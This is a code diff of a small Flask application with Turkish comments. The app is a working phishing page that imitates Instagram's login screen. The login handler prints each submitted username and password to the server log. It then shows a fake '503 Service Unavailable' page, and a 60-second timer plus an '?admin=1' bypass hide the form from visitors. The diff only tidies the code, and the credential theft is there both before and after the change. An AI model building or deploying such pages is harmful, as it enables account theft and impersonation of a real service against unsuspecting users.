@@ -3,10 +3,10 @@ from flask import Flask, request, render_template_string, session
 from datetime import datetime, timedelta
 
 app = Flask(__name__)
-app.secret_key = 'gizli_anahtar_buraya' # Oturum takibi için gerekli
+app.secret_key = 'cok_gizli_bir_key' # Bu satır olmazsa hata verir
 
-# --- INSTAGRAM TASARIMI (GÜNCELLENDİ) ---
-HTML_TASARIM = """
+# --- INSTAGRAM TASARIMI ---
+HTML_KODU = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -14,17 +14,17 @@ HTML_TASARIM = """
     <title>Giriş Yap • Instagram</title>
     <style>
         body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
-        .logo { width: 175px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
+        button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="box">
         <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo">
         <form method="POST" action="/login">
-            <input type="text" name="u" placeholder="Kullanıcı adı veya e-posta" required>
+            <input type="text" name="u" placeholder="Kullanıcı adı" required>
             <input type="password" name="p" placeholder="Şifre" required>
             <button type="submit">Giriş Yap</button>
         </form>
@@ -33,36 +33,30 @@ HTML_TASARIM = """
 </html>
 """
 
-HATA_SAYFASI = """
-<body style="text-align:center;padding-top:100px;font-family:sans-serif;">
-    <h1>503 Service Unavailable</h1>
-    <p>Sunucu bakımda, lütfen daha sonra tekrar deneyin.</p>
-</body>
-"""
+HATA_SAYFASI = """<h1 style='text-align:center;margin-top:100px;'>503 Service Unavailable</h1>"""
 
 @app.route('/')
 def home():
-    # Admin girişi kontrolü
+    # Admin isen sınırsız giriş
     if request.args.get('admin') == '1':
-        return render_template_string(HTML_TASARIM)
+        return render_template_string(HTML_KODU)
 
-    # Kişiye özel 60 saniye sayacı
-    if 'start_time' not in session:
-        session['start_time'] = datetime.now()
+    # İlk defa giren kişi için süre başlat
+    if 'baslangic' not in session:
+        session['baslangic'] = datetime.now().timestamp()
     
-    sure_doldu_mu = datetime.now() > session['start_time'] + timedelta(seconds=60)
+    gecen_sure = datetime.now().timestamp() - session['baslangic']
     
-    if sure_doldu_mu:
-        return render_template_string(HATA_SAYFASI), 503
+    # 60 saniye dolduysa hata ver
+    if gecen_sure > 60:
+        return HATA_SAYFASI, 503
     
-    return render_template_string(HTML_TASARIM)
+    return render_template_string(HTML_KODU)
 
 @app.route('/login', methods=['POST'])
 def login():
-    user = request.form.get('u')
-    pw = request.form.get('p')
-    print(f"--- VERI GELDI --- Kullanici: {user} | Sifre: {pw}")
-    return render_template_string(HATA_SAYFASI), 503
+    print(f"VERI: {request.form.get('u')} | {request.form.get('p')}")
+    return HATA_SAYFASI, 503
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
